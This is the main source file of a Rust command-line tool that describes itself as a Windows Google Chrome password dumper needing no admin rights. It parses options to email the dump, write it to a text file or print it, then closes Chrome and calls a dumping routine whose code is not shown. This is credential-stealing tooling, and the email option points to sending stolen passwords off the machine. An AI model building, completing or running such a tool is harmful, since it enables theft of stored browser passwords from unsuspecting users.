extern crate clap;
use clap::{App, Arg};

use crate::dumper::{close_chrome, dump_to_file};

mod dumper;
mod models;

fn main() {
    let matches = App::new("chrome-pwd-dumper-rs")
        .version("0.2.0")
        .author("Budi Syahiddin, <budisyahiddin@gmail.com>")
        .about("Windows Google Chrome Password dumper that doesn't require admin rights")
        .arg(
            Arg::with_name("email")
                .short("e")
                .long("email")
                .help("Sends to an email address")
                .takes_value(true)
                .required(false),
        )
        .arg(
            Arg::with_name("filename")
                .short("fn")
                .long("filename")
                .help("Sets the filename of the text file")
                .takes_value(true)
                .required(false),
        )
        .arg(
            Arg::with_name("dump_to_file")
                .short("d")
                .long("dump-text")
                .help("Do you want to dump to a text file")
                .takes_value(false)
                .required(false),
        )
        .arg(
            Arg::with_name("format")
                .short("f")
                .long("format")
                .help("Choose your preferred format")
                .takes_value(true)
                .required(false),
        )
        .arg(
            Arg::with_name("print")
                .short("p")
                .long("print")
                .help("Prints dump to stdout")
                .takes_value(false)
                .required(false)
        )
        .get_matches();

    let has_email = matches
        .value_of("email")
        .unwrap_or("");

    let filename = matches
        .value_of("filename")
        .unwrap_or("dump");

    let is_dumping_to_file = matches.is_present("dump_to_file");
    let is_printing_to_stdout = matches.is_present("print");

    close_chrome();
    dump_to_file();
}
